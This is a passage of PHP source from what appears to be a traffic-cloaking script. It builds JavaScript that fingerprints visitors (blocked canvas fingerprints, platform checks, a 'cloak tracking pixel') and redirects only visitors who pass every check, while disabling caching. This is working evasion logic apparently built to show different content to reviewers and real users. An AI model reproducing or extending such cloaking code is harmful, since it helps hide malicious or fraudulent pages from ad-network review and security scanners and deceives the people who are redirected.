							($canvasFingerprintCheckEnabled && !empty($blockedCanvasFingerprints) ? "testResults.isNotInBlockedCanvasListTest = (!inBlockedCanvasList());\n" : "") .
							(true ? "testResults.platformTest = (platformTest());\n" : "") .
							($cloakTrackingPixelEnabled && !empty($cloakTrackingPixelUrl) ? "addCloakTrackingPixel();\n" : "") . // added last because this uses JS test results
						   "jslog(testResults);

						   	var allTestResultsTrue = true;
							Object.keys(testResults).forEach(function(key, index) { if (this[key] === false) { allTestResultsTrue = false; } }, testResults);

						   	if (allTestResultsTrue)
						   	{
							    setTimeout(function()
								{
									var topDomain = getReferrerDomain();

									$redirectCode
								}, $redirectTimeout);
							}
					   	}

					   </script>";

		if ($outputMethod === "JS")
		{
			$scriptCode .= "\n<script type=\"text/javascript\">go();</script>";

			$resultHtml = str_replace("{script}", $scriptCode, $resultHtml);
			$resultHtml = str_replace("{queryString}", $queryString, $resultHtml);

			$resultHtml = createJSCode($resultHtml);
		}
		else
		{
			$onloadCode = " onload=\"go();\"";

			$resultHtml = str_replace("{script}", minify($scriptCode), $resultHtml);
			$resultHtml = str_replace("{onload}", $onloadCode, $resultHtml);
		}
	}

	header("Expires: Mon, 01 Jan 1985 05:00:00 GMT");
	header("Last-Modified: " . gmdate("D, d M Y H:i:s") . " GMT");
	header("Cache-Control: no-store, no-cache, must-revalidate");
	header("Cache-Control: post-check=0, pre-check=0, max-age=0", false);
	header("Pragma: no-cache");

	if ($outputMethod == "JS")
	{
		header("Content-Type: application/javascript");
	}

	echo $resultHtml;

?>